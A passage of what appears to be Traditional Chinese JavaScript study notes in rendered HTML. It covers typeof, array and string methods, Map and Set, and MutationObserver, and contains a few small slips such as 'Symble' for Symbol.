\"string\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"number\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"boolean\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> a<span class=\"token operator\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"object\"</span>\n\na <span class=\"token operator\">=</span> <span class=\"token function\">Symble</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">typeof</span> a<span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"symble\"</span></code></pre><p>但是 <code>typeof a</code> 並非詢問 <code>a</code> 變數的型別，而是詢問「目前在 <code>a</code> 中的值的型別是什麼」。JavaScript 的變數單純只是值的容器。</p>\n<p><code>null</code> 的類型是 <code>object</code>，這是由於歷史原因造成的。1995 年的 JavaScript 語言第一版，只設計了五種資料類型（物件、整數、浮點數、字串和布林值），沒考慮 <code>null</code>，只把它當作 <code>object</code> 的一種特殊值。後來 <code>null</code> 獨立出來，作為一種單獨的資料類型，為了兼容以前的代碼，<code>typeof null</code> 傳回 <code>object</code> 就沒法改變了，所以是一個萬年 Bug。</p>\n<p>我們可以利用 <code>null</code> 會被 <code>typeof</code> 檢測為 <code>object</code> 並且會轉為 <code>false</code> 的結果來驗證值是否為 <code>null。</code></p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>a <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">typeof</span> a <span class=\"token operator\">===</span> <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"null\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre><h2 id=\"基礎語法\">基礎語法</h2>\n<h3 id=\"forin-和-forof-的差別\">for...in 和 for...of 的差別</h3>\n<ol>\n<li>迭代 <strong>物件屬性</strong> 時使用 <code>for...in</code>，迭代 <strong>陣列</strong> 時使用 <code>for...of</code></li>\n<li><code>for..in</code> 輸出 <strong>屬性名稱 (key)</strong>，<code>for...of</code> 輸出 <strong>值 (value)</strong></li>\n<li><code>for...of</code> 是 ES6 的新語法，補足了 ES5 <code>for...in</code> 的不足之處</li>\n<li><code>for...of</code> 不能迭代物件，需與 <code>Object.keys()</code> 搭配使用</li>\n</ol>\n<h3 id=\"array\">Array</h3>\n<ul>\n<li><code>var fiveItems = new Array(5);</code>：建立指定長度陣列</li>\n<li><code>fill(value[, start=0[, end=this.length]])</code>：填入輸入值至陣列的指定索引開始至結尾處</li>\n<li><code>map()</code> 可以使用自訂判斷為真的值建立一個新陣列：<code>map1 = array1.map(x ⇒ x*2 );</code>，注意此方法與資料型態的 <code>Map()</code> 是不同東西。</li>\n<li><code>reduce()</code> 簡言之能夠簡化需要遞迴整個陣列的操作，並回傳一經過處理後的值。例如計算整個陣列總和可以使用 <code>array1.reduce((pre,cur) =&gt; pre+cur)</code> 求得。</li>\n<li>檢查陣列是否為空：<code>if (typeof image_array !== &#39;undefined&#39; &amp;&amp; image_array.length &gt; 0)</code></li>\n</ul>\n<h4 id=\"快速產生陣列內容\">快速產生陣列內容</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://stackoverflow.com/questions/3895478/does-javascript-have-a-method-like-range-to-generate-a-range-within-the-supp\">alternative range()</a></li>\n<li>數值: <code>[...Array(5).keys()];</code> =&gt; <code>[0, 1, 2, 3, 4]</code></li>\n<li>文字: <code>String.fromCharCode(...[...Array(&#39;D&#39;.charCodeAt(0) - &#39;A&#39;.charCodeAt(0) + 1).keys()].map(i =&gt; i + &#39;A&#39;.charCodeAt(0)));</code> ⇒ <code>&quot;ABCD&quot;</code></li>\n<li>組合: <code>for (const x of Array(5).keys()) console.log(x, String.fromCharCode(&#39;A&#39;.charCodeAt(0) + x));</code> ⇒ <code>0,&quot;A&quot; 1,&quot;B&quot; 2,&quot;C&quot; 3,&quot;D&quot; 4,&quot;E&quot;</code></li>\n</ul>\n<h4 id=\"slice-splice-split\">slice(), splice(), split()</h4>\n<h5 id=\"slice\">slice()</h5>\n<ul>\n<li><code>array.slice(begin, end)</code></li>\n<li>複製陣列項目，不會修改原始陣列，回傳指定兩點之間的內容</li>\n<li><code>begin</code>：開始複製項目的位置，負值則為反方向計算</li>\n<li><code>end</code>：結束複製項目的位置，留空時會複製至結尾</li>\n</ul>\n<h5 id=\"splice\">splice()</h5>\n<ul>\n<li><code>array.splice(start, deleteCount, item...)</code></li>\n<li>新增／刪除陣列項目，會修改原始陣列，回傳被刪除的項目</li>\n<li><code>start</code>：插入或刪除項目的位置，負值則為反方向計算</li>\n<li><code>deleteCount</code>：刪除的個數，傳入 0 則不會刪除</li>\n<li><code>item...</code>：要插入的新項目。</li>\n</ul>\n<h5 id=\"split\">split()</h5>\n<ul>\n<li><code>string.split(seperator, length)</code></li>\n<li>分割字串成陣列，不會修改原始字串，回傳分割後的字串陣列</li>\n<li><code>seperator</code>：字符或正規表達式，依照此參數分割字串</li>\n<li><code>length</code>：回傳陣列的最大長度</li>\n</ul>\n<h4 id=\"foreach-map-filter-find-every-some-reduce\">forEach(), map(), filter(), find(), every(), some(), reduce()</h4>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hsiangfeng.github.io/javascript/20190421/1216566123/\">關於 JS 陣列 20 種操作的方法</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://w3c.hexschool.com/blog/6594e4ff\">JavaScript 陣列 (array) 操作處理大全</a></li>\n</ul>\n<h5 id=\"foreach\">forEach()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// code here</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>處理陣列內<strong>每個</strong>資料</li>\n<li>無回傳值（<code>undefined</code>）</li>\n<li>會改變原始陣列資料</li>\n</ul>\n<h5 id=\"map\">map()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> item <span class=\"token operator\">+</span> item<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>處理陣列內<strong>每個</strong>資料</li>\n<li>回傳一個新的陣列</li>\n<li>不會改變原始陣列資料</li>\n</ul>\n<h5 id=\"filter\">filter()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> item <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>回傳<strong>所有</strong>處理為 true 的項目</li>\n<li>回傳一個新的陣列</li>\n</ul>\n<h5 id=\"find\">find()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> item <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>回傳<strong>第一個</strong>處理結果為 true 的項目</li>\n</ul>\n<h5 id=\"every\">every()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">every</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> item <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>檢查陣列內<strong>所有</strong>值是否符合條件</li>\n<li>回傳 boolean 值</li>\n</ul>\n<h5 id=\"some\">some()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">itemsArray<span class=\"token punctuation\">.</span><span class=\"token function\">some</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item<span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> array</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> item <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>檢查陣列內<strong>是否存在一</strong>值符合條件</li>\n<li>僅需有值符合即可</li>\n<li>回傳 boolean 值</li>\n</ul>\n<h5 id=\"reduce\">reduce()</h5>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> myArr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 處理每個元素後等待回傳結果，第一次處理時代入初始值 0</span>\n<span class=\"token keyword\">var</span> result <span class=\"token operator\">=</span> myArr<span class=\"token punctuation\">.</span><span class=\"token function\">reduce</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">prev<span class=\"token punctuation\">,</span> element</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// 與之前的數值加總，回傳後代入下一輪的處理</span>\n  <span class=\"token keyword\">return</span> prev <span class=\"token operator\">+</span> element<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li>自陣列首值依序處理</li>\n<li>第一次被呼叫時，<code>accumulator</code> 與 <code>currentValue</code> 的值可能為兩種不同的狀況：\n<br>├ 1. 呼叫 <code>reduce()</code> 有提供 <code>initialValue</code> 時，<code>accumulator</code> 會等於 <code>initialValue</code>，<code>currentValue</code> 等於陣列中的第一個元素值\n<br>└ 2. 未提供 <code>initialValue</code>時，<code>accumulator</code> 會等於陣列的第一個元素值，<code>currentValue</code> 等於陣列的第二個元素</li>\n</ul>\n<h4 id=\"如何安全使用會破壞-array-資料的-method\">如何安全使用會破壞 Array 資料的 Method</h4>\n<p>例如 <code>reverse()</code> 會直接改變原本陣列的資料：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> arr1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// arr1: [1,2,3]</span>\narr1<span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [3,2,1]</span>\narr1<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [3,2,1]</span></code></pre><p>可以使用展開運算子 <code>[...arr]</code> 或是 <code>concat()</code> 避開修改原本的陣列：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> arr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// arr2: [1,2,3]</span>\n<span class=\"token keyword\">const</span> changedArr2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>arr2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\narr2<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [1,2,3]</span>\nchangedArr2<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [3,2,1]</span></code></pre><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> arr3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// arr3: [1,2,3]</span>\n<span class=\"token keyword\">const</span> changedArr3 <span class=\"token operator\">=</span> arr3<span class=\"token punctuation\">.</span><span class=\"token function\">concat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\narr3<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [1,2,3]</span>\nchangedArr3<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// [3,2,1]</span></code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/poruruba/items/6c67c7eef34ed302feb3\">便利ページ：Javascript でちょっとした便利な機能を作ってみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=Mus_vwhTCq0\">JavaScript Pro Tips - Code This, NOT That - YouTube</a></li>\n</ul>\n<h3 id=\"string\">String</h3>\n<ul>\n<li><code>String.substr( start, length )</code></li>\n<li><code>String.substring( start, end )</code></li>\n<li>預設會擷取到最後一個字符</li>\n</ul>\n<h4 id=\"string-to-int\">String to Int</h4>\n<p><code>parseInt(string, radix)</code></p>\n<h3 id=\"object\">Object</h3>\n<ol>\n<li><code>obj[key] = value</code></li>\n<li><code>{ [key]: value }</code></li>\n<li><code>Object.keys(obj)</code></li>\n<li><code>Object.values(obj)</code></li>\n<li><code>Object.entries(obj)</code></li>\n<li><code>!(&quot;key&quot; in obj)</code></li>\n<li><code>obj.hasOwnProperty(&quot;key&quot;)</code></li>\n<li><code>delete obj[key]</code></li>\n</ol>\n<h3 id=\"queue--stack\">Queue &amp; Stack</h3>\n<ul>\n<li>JS 可直接使用 Array 的\n<br>├ <code>push</code> 放入結尾\n<br>├ <code>unshift</code> 放入開頭\n<br>├ <code>pop</code> 取出結尾\n<br>└ <code>shift</code> 取出開頭\n<br>來實作這兩種資料結構。</li>\n</ul>\n<h4 id=\"queue\">Queue</h4>\n<ul>\n<li>First In First Out</li>\n<li><code>unshift()</code>、<code>pop()</code></li>\n</ul>\n<h4 id=\"stack\">Stack</h4>\n<ul>\n<li>Last In First Out</li>\n<li><code>push()</code>、<code>pop()</code></li>\n</ul>\n<h3 id=\"map--set\">Map &amp; Set</h3>\n<ul>\n<li>JS 於 ES6 新增 <code>Set</code> 與 <code>Map</code> 兩種物件</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://javascript.info/map-set\">Map and Set</a></li>\n</ul>\n<h4 id=\"map-1\">Map</h4>\n<ul>\n<li><code>Map</code> 關心的是 <code>{ 鍵 (key) : 值 (value) }</code> 的對應關係</li>\n</ul>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token comment\">// ES6 Map</span>\n<span class=\"token keyword\">let</span> mapTable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Add</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"string\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"string value\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span> obj<span class=\"token operator\">:</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>\n  <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"function\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Get</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"string\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Has</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">has</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Iterator</span>\n<span class=\"token comment\">// returns for keys</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">keys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// returns for values</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// returns for [key, value], used by default in for...in</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Delete</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Delete All</span>\nmapTable<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Length</span>\nmapTable<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// To Array</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>mapTable<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"set\">Set</h4>\n<ul>\n<li><code>Set</code> 關心的是不重覆值的獨立元素 <code>{value1, value2}</code></li>\n</ul>\n<pre class=\"language-jsx\"><code class=\"language-jsx\"><span class=\"token comment\">// ES6 Set</span>\n<span class=\"token keyword\">let</span> setTable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Add</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Has</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">has</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Iterator</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">keys</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">values</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Delete</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Delete All</span>\nsetTable<span class=\"token punctuation\">.</span><span class=\"token function\">clear</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Length</span>\nsetTable<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// To Array</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">...</span>setTable<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nArray<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>setTable<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"mutationobserver\">MutationObserver</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.fundebug.com/2019/01/10/understand-mutationobserver/\">JavaScript 是如何工作的：使用 MutationObserver 跟踪 DOM 的变化</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.sessionstack.com/how-javascript-works-tracking-changes-in-the-dom-using-mutationobserver-86adc7446401\">How JavaScript works: tracking changes in the DOM using MutationObserver | by Alexander Zlatkov | SessionStack Blog</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://zh.javascript.info/mutation-observer\">DOM 变动观察器（Mutation observer）</a></li>\n</ul>\n<h4 id=\"簡介\">簡介</h4>\n<p><code>MutationObserver</code> 會在指定的 DOM 出現變化，例如增減節點、變更屬性、修改文字時回傳通知。</p>\n<h4 id=\"使用\">使用</h4>\n<p>想要使用 <code>MutationObserver</code> 之前，我們需要先建立一個 instance，並且傳入一個 function 讓它每次偵測到變化時調用。</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> mutationObserver <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">MutationObserver</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">mutations</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  mutations<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">mutation</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>mutation<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>建立好的物件有三個 methods：</p>\n<ul>\n<li><code>observe</code>：開始監聽變化，需要兩個參數—— 你想觀測的 DOM 節點和設定用的物件</li>\n<li><code>disconnect</code>：停止監聽變化</li>\n<li><code>takeRecords</code>：回傳 callback 啟動之前的最後一次修改</li>\n</ul>\n<p>這裡有個開始監聽變化的例子：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// Starts listening for changes in the root HTML element of the page.</span>\n<span class=\"token comment\">// 第一個傳入參數為監察目標，可改為如 document.querySelector(\"body\")</span>\nmutationObserver<span class=\"token punctuation\">.</span><span class=\"token function\">observe</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  attributes<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  characterData<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  childList<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  subtree<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  attributeOldValue<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  characterDataOldValue<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>當我們調用了 <code>mutationObserver.observe(...)</code> 開始監聽，網頁上的 DOM 出現變化時，我們就能在控制台裡看到 mutations 陣列裡的各個 <a target=\"_blank\" rel=\"nofollow\" href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/MutationObserver#MutationRecord\">MutationRecord</a> 的記錄。</p>\n<p>當工作完成，我們想要停止觀察 DOM，可以調用相關 method：</p>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// Stops the MutationObserver from listening for changes.</span>\nmutationObserver<span class=\"token punctuation\">.</span><span class=\"token function\">disconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>在 <code>MutationObserver</code> 出現之前，人們用來觀測網頁元件變化的方法有：</p>\n<ul>\n<li>Polling</li>\n<li>MutationEvents</li>\n<li>CSS animations</li>\n</ul>\n<p>Polling：最簡單也最簡潔的方法，使用瀏覽器的 <code>setInterval</code> WebAPI 定期檢查是否發生任何變化，但這種方法會明顯地降低網路應用／網站的效能。</p>\n<p>MutationEvents：於 2000 年加入的 <a target=\"_blank\" rel=\"nofollow\" 